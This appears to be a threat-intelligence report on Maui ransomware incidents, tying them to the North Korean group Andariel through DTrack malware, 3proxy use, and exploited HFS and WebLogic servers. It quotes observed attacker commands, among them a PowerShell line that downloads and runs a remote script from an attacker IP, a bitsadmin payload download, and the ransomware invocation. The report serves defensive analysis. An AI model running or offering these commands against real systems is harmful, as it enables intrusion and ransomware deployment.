On July 7, 2022, the CISA published an alert, entitled, “North Korean State-Sponsored Cyber
Actors Use Maui Ransomware To Target the Healthcare and Public Health Sector,” related to
a Stairwell report, “Maui Ransomware.” Later, the Department of Justice announced that they
had effectively clawed back $500,000 in ransom payments to the group, partly thanks to new
legislation. We can confirm a Maui ransomware incident in 2022, and add some incident and
attribution findings.
We extend their “first seen” date from the reported May 2021 to April 15th 2021, and the
geolocation of the target, to Japan. Because the malware in this early incident was compiled
on April 15th, 2021, and compilation dates are the same for all known samples, this incident
is possibly the first ever involving the Maui ransomware.

1/7

While CISA provides no useful information in its report to attribute the ransomware to a North
Korean actor, we determined that approximately ten hours prior to deploying Maui to the
initial target system, the group deployed a variant of the well-known DTrack malware to the
target, preceded by 3proxy months earlier. This data point, along with others, should openly
help solidify the attribution to the Korean-speaking APT Andariel, also known as Silent
Chollima and Stonefly, with low to medium confidence.

Background
We observed the following timeline of detections from an initial target system:
1. 2020-12-25 Suspicious 3proxy tool
2. 2021-04-15 DTrack malware
3. 2021-04-15 Maui ransomware

Once this malware is spawned, it executes an embedded shellcode, loading a final Windows
in-memory payload. This malware is responsible for collecting victim information and sending
it to the remote host. Its functionality is almost identical to previous DTrack modules. This
malware collects information about the infected host via Windows commands. The inmemory payload executes the following Windows commands:

2/7

1

"C:\Windows\system32\cmd.exe" /c ipconfig /all > "%Temp%\temp\res.ip"

2

"C:\Windows\system32\cmd.exe" /c tasklist > "%Temp%\temp\task.list"

5

"%Temp%\temp\netsh.res"

6

"C:\Windows\system32\cmd.exe" /c ping -n 1 8.8.8.8 > "%Temp%\temp\ping.res"

In addition, the malware collects browser history data, saving it to the browser.his file, just as
the older variant did. Compared to the old version of DTrack, the new information-gathering
module sends stolen information to a remote server over HTTP, and this variant copies
stolen files to the remote host on the same network.

Maui ransomware
The Maui ransomware was detected ten hours after the DTrack variant on the same server.

Multiple run parameters exist for the Maui ransomware. In this incident, we observe the
actors using “-t” and “- x” arguments, along with a specific drive path to encrypt:
1

C:\Windows\Temp\temp\bin\Maui.exe -t 8 -x E:

In this case, “-t 8” sets the ransomware thread count to eight, “-x” commands the malware to
“self melt”, and the “E:” value sets the path (the entire drive in this case) to be encrypted. The
ransomware functionality is the same as described in the Stairwell report.
The malware created two key files to implement file encryption:

Similar DTrack malware on different victims
Pivoting on the exfiltration information to the adjacent hosts, we discovered additional victims
in India. One of these hosts was initially compromised in February 2021. In all likelihood,
Andariel stole elevated credentials to deploy this malware within the target organization, but
this speculation is based on paths and other artifacts, and we do not have any further details.

The primary objective of this malware is the same as in the case of the aforementioned
victim in Japan, using different login credentials and local IP address to exfiltrate data.

Windows commands to exfiltrate data
From the same victim, we discovered additional DTrack malware (MD5
87e3fc08c01841999a8ad8fe25f12fe4) using different login credentials.

Additional DTrack module and initial infection method
The “3Proxy” tool, likely utilized by the threat actor, was compiled on 2020-09-09 and
deployed to the victim on 2020-12-25. Based on this detection and compilation date, we
expanded our research scope and discovered an additional DTrack module. This module
was compiled 2020-09-16 14:16:21 and detected in early December 2020, having a similar
timeline to the 3Proxy tool deployment.

This DTrack module is very similar to the EventTracKer module of DTrack, which was
previously reported to our Threat Intelligence customers. In one victim system, we
discovered that a well-known simple HTTP server, HFS7, had deployed the malware above.
After an unknown exploit was used on a vulnerable HFS server and “whoami” was executed,
the Powershell command below was executed to fetch an additional Powershell script from
the remote server:
1

C:\windows\system32\WindowsPowershell\v1.0\powershell.exe IEX (New-Object
Net.WebClient).DownloadString('hxxp://145.232.235[.]222/usr/users/mini.ps1')

The mini.ps1 script is responsible for downloading and executing the above DTrack malware
via bitsadmin.exe:
1

bitsadmin.exe /transfer myJob /download /priority high

2

"hxxp://145.232.235[.]222/usr/users/dwem.cert"
"%appdata%\microsoft\mmc\dwem.cert"

The other victim operated a vulnerable Weblogic server. According to our telemetry, the actor
compromised this server via the CVE-2017-10271 exploit. We saw Andariel abuse identical
exploits and compromise WebLogic servers in mid-2019, and previously reported this activity
to our Threat Intelligence customers. In this case, the exploited server executes the
Powershell command to fetch the additional script. The fetched script is capable of
downloading a Powershell script from the server we mentioned above
(hxxp://145.232.235[.]222/usr/users/mini.ps1). Therefore, we can summarize that the actor
abused vulnerable Internet-facing services to deploy their malware at least until the end of
2020.

Victims
The July 2022 CISA alert noted that the healthcare and public health sectors had been
targeted with the Maui ransomware within the US. However, based on our research, we
believe this operation does not target specific industries and that its reach is global. We can
confirm that the Japanese housing company was targeted with the Maui ransomware on
April 15, 2021. Also, victims from India, Vietnam, and Russia were infected within a similar
timeframe by the same DTrack malware as used in the Japanese Maui incident: from the end
of 2020 to early 2021.
Our research suggests that the actor is rather opportunistic and could compromise any
company around the world, regardless of their line of business, as long as it enjoys good
financial standing. It is probable that the actor favors vulnerable Internet-exposed web
services. Additionally, the Andariel deployed ransomware selectively to make financial
profits.

Attribution
According to the Kaspersky Threat Attribution Engine (KTAE), the DTrack malware from the
victim contains a high degree of code similarity (84%) with previously known DTrack
malware.
Also, we discovered that the DTrack malware (MD5 739812e2ae1327a94e441719b885bd19)
employs the same shellcode loader as “Backdoor.Preft” malware (MD5
2f553cba839ca4dab201d3f8154bae2a), published/reported by Symantec – note that
Symantec recently described the Backdoor.Preft malware as “aka Dtrack, Valefor”. Apart
from the code similarity, the actor used 3Proxy tool (MD5
5bc4b606f4c0f8cd2e6787ae049bf5bb), and that tool was also previously employed by the
6/7

Andariel/StoneFly/Silent Chollima group (MD5 95247511a611ba3d8581c7c6b8b1a38a).
Symantec attributes StoneFly as the North Korean-linked actor behind the DarkSeoul
incident.

Conclusions
Based on the modus operandi of this attack, we conclude that the actor’s TTPs behind the
Maui ransomware incident is remarkably similar to past Andariel/Stonefly/Silent Chollima
activity:
Using legitimate proxy and tunneling tools after initial infection or deploying them to
maintain access, and using Powershell scripts and Bitsadmin to download additional
malware;
Using exploits to target known but unpatched vulnerable public services, such as
WebLogic and HFS;
Exclusively deploying DTrack, also known as Preft;
Dwell time within target networks can last for months prior to activity;
Deploying ransomware on a global scale, demonstrating ongoing financial motivations
and scale of interest
